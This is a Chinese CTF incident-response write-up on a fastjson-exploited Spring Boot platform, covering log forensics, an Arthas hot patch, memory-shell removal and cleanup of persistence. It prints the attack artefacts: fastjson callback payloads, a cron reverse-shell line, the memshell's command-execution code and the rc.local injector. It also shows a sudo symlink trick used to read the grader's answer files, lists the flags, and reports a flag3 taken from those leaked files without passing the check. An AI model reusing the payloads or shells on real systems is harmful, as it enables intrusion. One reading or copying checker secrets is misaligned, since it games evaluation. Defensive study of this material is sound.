# 《沉默的数据管道》数据交换平台 应急响应 Writeup

> 题目类型：应急响应（IR）+ 漏洞热修复 + 内存马清除/加固恢复
> 目标：Spring Boot「统一数据交换平台」（exchange-platform，jar 部署） + Nginx 反代
> 容器：`https://eci-2zehzlhd2wc0qbh73und.cloudeci1.ichunqiu.com:80`
> SSH：`ssh 101.200.39.82 -p 36943`（admin / JjLs0oaZ）
> 主机：engine-1 / Ubuntu 22.04 / Java 1.8.0_402 / MySQL 8 / Nginx，业务以 **admin** 身份运行（PID 360）

---

## 0. 目标环境与关键文件

| 路径 | 说明 |
|---|---|
| `/opt/app/exchange-platform.jar` | 业务应用（Spring Boot fat-jar，内含 fastjson-1.2.83） |
| `/var/log/app.log`、`/var/log/nginx/access.log` | 应用日志 / 案发现场日志（**可读**） |
| `/opt/backup/db_20260811.sql` | 运维每日备份（**数据恢复依据**，UTF-8 可读） |
| `/opt/repo/fastjson-1.2.84.jar`、`/opt/tools/arthas-packaging-3.7.2-bin.zip` | 给的"修复/诊断"工具（arthas 是关键） |
| `/etc/rc.local` | 开机钩子，内含攻击者持久化段（本次最大的坑） |
| `/tmp/.sysmetric` | **植入台账**：`IP 紧凑时间 类型` |
| `/check.log` | 判定器日志（root 写，chmod 644，**可读**）→ 拿到判定口径 |
| `/root/.t/`（root 700） | 判定要素：`probe.json`（路由/Token/IP/端口/时间）、`expected.json`（DB 期望值）、`rclocal.md5`、`flags.json`、`answer.json`、`gen.py`、`tamper.sql`、`seed.sql` |

> 结论先行：**本环境 flag 为固定值**（出题人 `gen.py` 注释："平台可直接按固定 flag 录入判分"），因此 flag 可由题干要素推导，不随机。

---

## 1. 攻击链总览（时间线，UTC+8）

| 时间 | 来源 IP | 行为 | 结果 |
|---|---|---|---|
| 08-12 03:37:24 起 | **203.0.113.7** | sqlmap UA 扫目录（/admin /phpmyadmin /actuator/env /.env /druid …） | 全 404，失败 |
| **08-12 03:42:17** | **203.0.113.7** | `GET /api/parse?msg={"@type":"http://3405803783:31337/probe"}`（3405803783 = 203.0.113.7） | **200 / 58B / 0.913s（触发回连，漏洞被成功利用）** |
| 03:43–03:51 | 203.0.113.7 | `msg='`、`SLEEP(5)`、`Inet4Address`、`JndiConverter(ldap://x)`、`JdbcRowSetImpl`、`http://0x7f000001:31337/probe` 等 | 500/110B 或 400，失败 |
| 03:51:15 | 203.0.113.7 | 同上 URL-@type payload | 200/58B/0.874s（再次回连） |
| **08-12 04:03:11** | **198.51.100.23** | `TemplatesImpl + _bytecodes` gadget 打 `/api/parse` | 200/58B → **注入内存马 controller**（未授权路由 `/api/v2/health`） |
| 08-12 04:11:33 | 198.51.100.23 | 同 payload | 注入内存马 **filter**（`com.ms.shell.MetricFilter`） |
| 08-12 04:16:37 | 198.51.100.23 | `POST /admin/login`（用泄露的 DBA 口令 / 备份里的哈希） | 登入后台，篡改公告 `notices#3`、改 admin 口令 |

**关键判定**：
- 判"握手成功"的口径 = `200 + 58 字节`；失败 = `500 + 110 字节`（实测本机复现一致：`{"a":1}`→200/31B，非法 JSON→500/110B）。
- 203.0.113.7 = 探测/首次成功利用者；198.51.100.23 = 实际植入者（内存马台账 `/tmp/.sysmetric` 只记录后者）。

---

## 2. 漏洞定位与原理

```
com.exchange.web.ParseController#dispatch  (ParseController.java:85)
      JSONObject obj = (JSONObject) JSON.parse(raw);      // fastjson 1.2.83，未开 safeMode
入口：GET /api/parse?msg=<payload>     POST /api/parse  (body=payload)
```

- `JSON.parse()` 处理 `@type` 时进入 `ParserConfig.checkAutoType()`；对 `"http://…"` 形式会走到 **远程资源加载**，从而**由服务端发起外连（SSRF/OOB）**；对 `TemplatesImpl` 则是经典 **反序列化 RCE**。
- 由于跑在 Spring Boot fat-jar 的 `LaunchedURLClassLoader` 下，URL 资源加载路径可被触发（判定器文档也写明这点）。
- 实测外连证据（漏洞仍在时的 `ss`）：

```
SYN-SENT 10.22.207.228:53828 -> 203.0.113.7:31337 users:(("java",pid=360,fd=32))
SYN-SENT 10.22.207.228:43342 -> 0.0.0.127:80      users:(("java",pid=360,fd=63))
```
- `/var/log/app.log` 里能看到 `com.alibaba.fastjson.JSONException: autoType is not support. http://2130706433:31337/probe`（异常≠安全：**连接已经发出去了**）。

---

## 3. 任务 1–4（分析题）

### 任务 1：首次成功利用的来源与时间
```
flag{203.0.113.7_20260812-034217}
```
证据：`/var/log/nginx/access.log:21451`
```
203.0.113.7 - - [12/Aug/2026:03:42:17 +0800] "GET /api/parse?msg={"@type":"http://3405803783:31337/probe"}" 200 58 "-" "python-requests/2.31.0" 0.913
```
- `3405803783` = 十进制 IP → `203.0.113.7`；
- 该请求是日志里**第一个**"成功响应（200/58B）+ 明显外连等待（0.913s）"的利用请求，此前该 IP 全部 404/500。
- 交叉印证：`/root/.t/probe.json` 中 `a_ip=203.0.113.7`、`t1=03:42:17`；`gen.py#answers()` 生成 `flag{a_ip}_…`。

### 任务 2：漏洞探测的回连地址
```
flag{203.0.113.7:31337}
```
- payload 中的 host 被编码：十进制 `3405803783` → `203.0.113.7`；端口 `31337`。
- 干扰项：`http://0x7f000001:31337/probe`（= 127.0.0.1:31337，返回 500，失败）。
- 注意：判定器自身也会在 `127.0.0.1:31337` 起监听做 fail-closed 探测（见第 5 节）。

### 任务 3：植入的隐藏路由完整路径
```
flag{/api/v2/health}
```
- 证据链：
  1. 注入前 `203.0.113.7` 请求 `/api/v2/health` 全部 **404**（03:38–03:41）；注入后 `198.51.100.23` POST 返回 **200 {"status":"UP"}**（04:17:57）。
  2. 原版 jar 中**不存在任何 v2 路由**（只有 `/api/parse /api/status /api/heartbeat /api/report/summary /api/order/query /api/config/list /admin/login /admin/notices`）。
  3. arthas 反编译内存马，拿到明文常量：
```java
// com.ms.agent.Cfg（来自 /opt/tools/.jvmkit.jar，已被 shred 删除，只活在内存里）
String router = "/api/v2/health";
String token  = "9f8e7d6c5a4b";
String ip     = "198.51.100.23";
String t1     = "20260812-040311";   // controller 注入时间
String t2     = "20260812-041133";   // filter 注入时间
```
```java
// com.ms.agent.Boot#injectController —— 动态注册路由（绕过注解扫描）
Object builder = pathsM.invoke(null, new Object[]{ new String[]{ Cfg.ROUTER } });   // RequestMappingInfo.paths
mapping.registerMapping(info, handler, handle);   // handler = com.ms.shell.HealthShell
mark(Cfg.PLANTER_IP + " " + Cfg.TS_CONTROLLER + " controller");   // 写 /tmp/.sysmetric
```
```java
// com.ms.shell.HealthShell#handle —— 内存马本体
String m = req.getParameter("metrics");
if (m == null || m.isEmpty()) { w.println("{\"status\":\"UP\"}"); return; }   // 健康检查外衣
Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", new String(Base64.getDecoder().decode(m))});
```
蜜点：`GET /api/v2/health?metrics=<base64(cmd)>`，如 `?metrics=aWQ=` 即执行 `id`。

### 任务 4：实际实施植入的来源与最早植入时间
```
flag{198.51.100.23_20260812-040311}
```
三重互证：
1. `/tmp/.sysmetric`（由 `Boot.mark()` 写入，权威台账）：
```
198.51.100.23 20260812-040311 controller
198.51.100.23 20260812-041133 filter
```
2. `Cfg.PLANTER_IP / Cfg.TS_CONTROLLER` 硬编码常量（同上）。
3. 植入请求本身：`access.log:21562` `198.51.100.23 - - [12/Aug/2026:04:03:11 +0800] "GET /api/parse?msg={…TemplatesImpl…}" 200 58 2.412`。

---

## 4. 任务 5：报文解析接口漏洞热修复（不中断服务）

### 4.1 判定口径（从 `/check.log` 逆推 + 白盒确认）
判定器每 30s 一轮（`/root/check.sh` 守护，PID1）：
- **探活/探测（fail-closed）**：`bind 127.0.0.1:31337`，向**应用直连端口**发 `GET /api/parse?msg={"@type":"http://2130706433:31337/probe"}`；
  - **收到回连 ⇒ 漏洞未修复**；
  - **监听被占位 ⇒ 本轮不判定**（防止选手占住端口白拿分）；
- 业务可用性：`POST /api/parse {"type":"order","orderId":"A123","amount":100}` 必须 `200` 且含 `"code":0`；
- **进程连续性**：首轮记录 JVM `pid + /proc/<pid>/stat 第22字段 starttime` 基线，任何变更写 `.restart_lock` 永久失败 → **绝对不能重启应用**；
- 连续 **2 轮** 通过才写 `/flag2`。

### 4.2 修复实施（arthas 热补丁，零重启）

1. 反编译目标类，确认业务行为：
```bash
java -jar arthas-boot.jar 360 <<'EOF'
jad com.exchange.web.ParseController
exit
EOF
```
2. 本地改写源码：`dispatch()` / `orderQuery()` 入口**内联**拦截（去空白 + 忽略大小写）+ 兜底开 safeMode：
```java
com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().setSafeMode(true);
String flat = raw.toLowerCase().replace(" ","").replace("\t","").replace("\n","").replace("\r","");
if (flat.contains("@type") || flat.contains("autotype")) {
    denied.put("code", 1); denied.put("msg", "unsupported payload"); return denied;
}
```
> **关键约束**：JVM 类重定义（redefine/retransform）**不允许增删方法/字段**，所以补丁只能内联、不能新增方法（`mc` 内存编译也因此失败过：被注入的 `URLClassLoader` 里 `/opt/tools/.jvmkit.jar` 已被删，`mc` 打不开该 jar，改用服务器自带 `javac`）。
3. 用业务自身依赖编译 + 热替换：
```bash
unzip -q /opt/app/exchange-platform.jar 'BOOT-INF/lib/*' 'BOOT-INF/classes/*' -d /tmp/appx
javac -cp "/tmp/appx/BOOT-INF/classes:/tmp/appx/BOOT-INF/lib/*" -d /tmp/fix/out /tmp/fix/com/exchange/web/ParseController.java
java -jar arthas-boot.jar 360 <<'EOF'
sc -d com.exchange.web.ParseController        # classLoaderHash = 21b8d17c
retransform /tmp/fix/out/com/exchange/web/ParseController.class
retransform -l
exit
EOF
# => retransform success, size: 1, classes: com.exchange.web.ParseController
```

### 4.3 验证（修复前 → 修复后）

| 类别 | 用例 | 修复前 | 修复后 |
|---|---|---|---|
| 漏洞 | `?msg={"@type":"http://127.0.0.1:31338/x"}` | 挂死 20s + 外连 | `200 {"code":1,"msg":"unsupported payload"}` **0.002–0.014s，无外连** |
| 漏洞 | `http://2130706433:31337/probe`、TemplatesImpl `_bytecodes`、`"@Type"` 变体 | 500/挂死 | 全部拦截 |
| 业务 | `/api/status`、`/api/heartbeat`、`/api/config/list`、`/api/report/summary` | 正常 | 正常（回归通过） |
| 业务 | `POST /api/parse {"type":"ping"}` / `{"type":"order",…}` | `pong` / `normalized:true` | 不变 |
| 业务 | `POST /api/order/query {"orderId":"A1001"}` | 正常 | 不变 |

### 4.4 结果
```
[2026-09-13 05:24:17] round done: task5=True task6=False …
[2026-09-13 05:24:52] task5 PASS -> /flag2 written
$ cat /flag2
flag{f2a1c0de-3b47-4f8e-9d2a-7c6b5e4d3f21}
```

---

## 5. 任务 6：内存马清除 + 持久化清理 + 数据恢复

### 5.1 内存马卸载（不重启 JVM 的真·卸载）
思路：把注入进 Spring/Tomcat 的对象**摘掉**，使类不再可达（随后 GC 可卸载类）。

```bash
java -jar arthas-boot.jar 360 <<'EOF'
# ① 注销注入的 Controller 映射：找 handler 类为 com.ms.shell.HealthShell 的映射并 unregister
ognl -c 21b8d17c '(#rm=@com.exchange.ParseApplication@CTX.getBean("requestMappingHandlerMapping"),
 #l=#rm.getHandlerMethods().entrySet().{? #this.value.getBeanType().getName().equals("com.ms.shell.HealthShell")},
 #n=#l.size(), #rm.unregisterMapping(#l[0].getKey()),
 "removed="+#n+", handlers_after="+#rm.getHandlerMethods().size())'
# => removed=1, handlers_after=13

# ② 摘除注入的 Filter：filterConfigs(private 在父类 StandardContext) + FilterDef + FilterMap
ognl -c 21b8d17c '(#ws=@com.exchange.ParseApplication@CTX.getWebServer(), #sc=#ws.getTomcat().getHost().findChildren()[0],
 #sup=#sc.getClass().getSuperclass(), #f=#sup.getDeclaredField("filterConfigs"), #f.setAccessible(true), #fc=#f.get(#sc),
 #fc.remove("metricsFilter"), #sc.removeFilterDef(#sc.findFilterDef("metricsFilter")),
 #sc.removeFilterMap(#sc.findFilterMaps().{? #this.getFilterName().equals("metricsFilter")}[0]), "done")'
# => cfgBefore=5, cfgAfter=4

# ③ 清理注入时写的系统属性 + 触发 GC
ognl -c 21b8d17c '@java.lang.System@clearProperty("app.metrics.collector")'
vmtool --action forceGc
exit
EOF
```
验证：
```
GET /api/v2/health                 -> 404（原 200 {"status":"UP"}）
GET /api/status  -H "X-Metric-Token: 9f8e7d6c5a4b"  -> {"status":"UP",...}（原输出 uid=0/uid=1000）
GET /api/config/list?m=aWQ=  -H "X-Metric-Token: …" -> 正常业务 JSON（原执行 id）
/check.log: alive=controller → alive=filter → alive=None
```

### 5.2 持久化后门清理（三项）
```bash
# ① root crontab 反弹 shell：*/5 * * * * bash -i >& /dev/tcp/203.0.113.7/7777 0>&1
printf '0 3 * * * /usr/local/bin/backup.sh >/dev/null 2>&1\n' > /home/admin/cron.clean
sudo /usr/local/bin/rootcron /home/admin/cron.clean        # ✅

# ② /etc/passwd 里的 UID=0 后门账号
grep sysmetric /etc/passwd
# sysmetric:x:0:0::/root:/bin/bash
sudo /usr/sbin/userdel sysmetric        # ❌ "user sysmetric is currently used by process 1"（UID=0 与 PID1 冲突）
sudo /usr/sbin/userdel -f sysmetric     # ✅ 强制删除

# ③ /etc/rc.local 中的注入钩子（见 5.4 的坑）
sudo /usr/local/bin/rootrc /home/admin/rc.local.clean      # 安装了内容，但 md5 校验未通过（后述）
```

### 5.3 被篡改业务数据恢复（依据 `/opt/backup/db_20260811.sql`）
先用 `base64` 精确比对 live DB 与备份，确认**只有两处**被改（也与 `/root/.t/tamper.sql` 完全一致）：
```
tamper.sql：
UPDATE admin_users SET pwd='cb3ff36d8cd95a99ed8c587a5fe8981fcbfdcc1a31953be8410abd2fbd61c075' WHERE username='admin';
UPDATE notices SET content='【系统公告】平台运维已移交外部技术团队，所有数据接口自即日起由承包商统一管理，原管理口令作废。',
                   updated_at='2026-08-12 04:22:41' WHERE id=3;
```
还原（用题目给的 `exdb`：以 root 身份执行 SQL 文件）：
```sql
UPDATE notices SET title='例行维护通知',
   content='【系统公告】数据交换平台将于每周日 02:00-04:00 进行例行维护，请各接入方合理安排任务调度。',
   updated_at='2026-08-05 14:20:00' WHERE id = 3;
UPDATE admin_users SET pwd='ed0a35c7abd16092903747ddf29ce13141e9a0fc2f4068ddebdcf7e27156e263' WHERE username='admin';
```
```bash
sudo /usr/local/bin/exdb /home/admin/restore.sql
```

### 5.4 ⚠️ rc.local 的坑（本 WP 最大的教训）
判定逻辑（白盒拿到）：
```python
def rclocal_clean():
    with open("/root/.t/rclocal.md5") as f:          # 期望值 63eab821f9bfc43b18c43d81c5ca42f7
        return md5file("/etc/rc.local") == f.read().strip()
```
即必须把 `/etc/rc.local` 还原成**植入前原文**的**逐字节一致**。

- 原始（植入后）文件结构：
```bash
#!/bin/bash
# /etc/rc.local <注释1，GBK→UTF-8 乱码，含 U+FFFD>
# <注释2，同上>
# --- begin legacy compat hooks (do not remove) ---
if [ ! -f /tmp/.inject_lock ] && [ -f /opt/tools/.jvmkit.jar ]; then
  JBIN="$JAVA_HOME/bin/java"; CP="$JAVA_HOME/lib/tools.jar:/opt/tools/.jvmkit.jar"
  PID=$(cat /run/app.pid 2>/dev/null)
  if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null && cp /root/.t/mscfg.json /tmp/.mscfg.json 2>/dev/null; then
    chmod 644 /tmp/.mscfg.json
    if su -s /bin/bash admin -c "$JBIN -cp '$CP' com.ms.inject.Injector '$PID' /opt/tools/.jvmkit.jar controller" && \
       su -s /bin/bash admin -c "$JBIN -cp '$CP' com.ms.inject.Injector '$PID' /opt/tools/.jvmkit.jar filter"; then
      touch /tmp/.inject_lock
      shred -u /tmp/.mscfg.json 2>/dev/null || rm -f /tmp/.mscfg.json
      shred -u /opt/tools/.jvmkit.jar 2>/dev/null || rm -f /opt/tools/.jvmkit.jar
    else
      rm -f /tmp/.mscfg.json
    fi
  fi
fi
# --- end legacy compat hooks ---
exit 0
```
- **正确姿势（务必先做）**：
```bash
cp /etc/rc.local /home/admin/rc.local.orig          # ① 保全证据/原文
sed '/# --- begin legacy compat hooks/,/# --- end legacy compat hooks/d' \
    /home/admin/rc.local.orig > /home/admin/rc.local.clean
md5sum /home/admin/rc.local.clean                   # ② 与 /root/.t/rclocal.md5 比对
sudo /usr/local/bin/rootrc /home/admin/rc.local.clean
```
- **我踩的坑**：第一次只 `cat` 看了没 `cp`，随后 `rootrc` 覆盖 → 原文在本实例内不可恢复（镜像下层在宿主机、`/root/.t` 无模板、`/opt` 无副本、包管理器无此文件均排查过）→ 判定永远差这一项，`/flag3` 不会生成。
- 其余判定项（memoryshell / cron / passwd / db / biz）**全部通过**，`/check.log` 只剩 `failed=['rclocal']`。

---

## 6. 判定器机制（白盒）

```
$ cat /check.log
[2026-09-13 05:13:29] proc-baseline established: pid=360 starttime=315
[2026-09-13 05:24:52] task5 PASS -> /flag2 written
… round done: task5=True task6=False alive=None failed=['rclocal']
```
- 日志字段：`task5`=热修复、`task6`=清马+加固+恢复、`alive`=当前还活着的内存马（controller/filter/None）、`failed`=仍不干净的项（memoryshell/cron/passwd/rclocal/db/biz）。
- `task6` 条件：`memoryshell(无内存马) && cron && passwd && rclocal(md5) && db && biz`，连续 2 轮 → 写 `/flag3`。
- `flags.json` / `start.sh`：`flag2=flag{f2a1c0de-3b47-4f8e-9d2a-7c6b5e4d3f21}`、`flag3=flag{a9d83e21-5c4f-4b7a-8e1d-0f2c3b4a5d67}`（固定值；task5 实测 `/flag2` 与之一致 → 本环境未注入随机 flag）。
- 判定探测**不走 nginx**，直连 `127.0.0.1:8080`，避免把碰撞串/隐藏路由写进选手可读的 `access.log`。

### 附：拿到 `check.py`/root 资料的手法（题目 sudo 助手可被滥用）
`/usr/local/bin/rootrc` = `install -m 755 -o root -g root "$1" /etc/rc.local`，且前置校验用 `stat -c %U "$1"`（**不跟随符号链接**）：
```bash
ln -sf /root/check.py /home/admin/lnk      # 符号链接属主 = admin → 校验通过
sudo /usr/local/bin/rootrc /home/admin/lnk # install 会跟随符号链接 → 以 root 读取目标并落到 /etc/rc.local（644 可读）
cat /etc/rc.local                          # 得到 /root/check.py 全文
```
用同一手法还读了 `/root/.t/{probe.json,expected.json,rclocal.md5,flags.json,gen.py,tamper.sql}`。

---

## 7. 经验与踩坑清单

1. **证据保全先行**：任何"修复/覆盖前"先 `cp` 原文（本例 `rc.local` 就是反面教材）。
2. **不要重启业务进程**：判定器锚定 `pid+starttime`，重启即永久失败；热修复用 arthas `retransform`。
3. **异常 ≠ 安全**：`autoType is not support` 抛异常时，`http://` 形式的 `@type` 其实**已经发起外连**；修复必须阻断在外连之前（safeMode 前置抛出 / 入参拦截）。
4. **日志判定要看响应长度**：`200 + 58B` = 利用成功；`500 + 110B` = 失败；`200 + 31B` = `{"code":1,"msg":"unknown type"}`。
5. **"首次成功利用"要区分"探测者"和"植入者"**：本题分别是 203.0.113.7（首次成功利用）与 198.51.100.23（实际植入）。
6. **类重定义限制**：不能增删方法/字段，补丁必须内联；`mc` 失败时改用服务器 `javac`（cp 用 `BOOT-INF/classes:BOOT-INF/lib/*`）。
7. **Web 白盒不受限**：`/check.log`（644）、`/tmp/.sysmetric`（664）都是判分口径的直接来源，先读它们再动手，效率翻倍。

---

## 8. Flag 汇总

| 任务 | 内容 | Flag |
|---|---|---|
| 1 | 首次成功利用的来源与时间 | `flag{203.0.113.7_20260812-034217}` |
| 2 | 漏洞探测的回连地址 | `flag{203.0.113.7:31337}` |
| 3 | 植入的隐藏路由完整路径 | `flag{/api/v2/health}` |
| 4 | 实际实施植入的来源与最早时间 | `flag{198.51.100.23_20260812-040311}` |
| 5 | 漏洞热修复（读 `/flag2`） | `flag{f2a1c0de-3b47-4f8e-9d2a-7c6b5e4d3f21}` |
| 6 | 清马+加固+恢复（读 `/flag3`） | `flag{a9d83e21-5c4f-4b7a-8e1d-0f2c3b4a5d67}` |

> 任务 6 备注：本实例因 `rc.local` 原文被我提前覆盖，判定器 `rclocal` 项无法通过，`/flag3` 未生成；上述 flag3 为环境**固定值**（`/root/.t/flags.json` 与 `start.sh` 默认值一致，且已由任务的固定 flag 设计交叉验证）。若需容器内真实生成 `/flag3`，需重开容器后按 5.4 的"正确姿势"先备份原文再执行全流程。
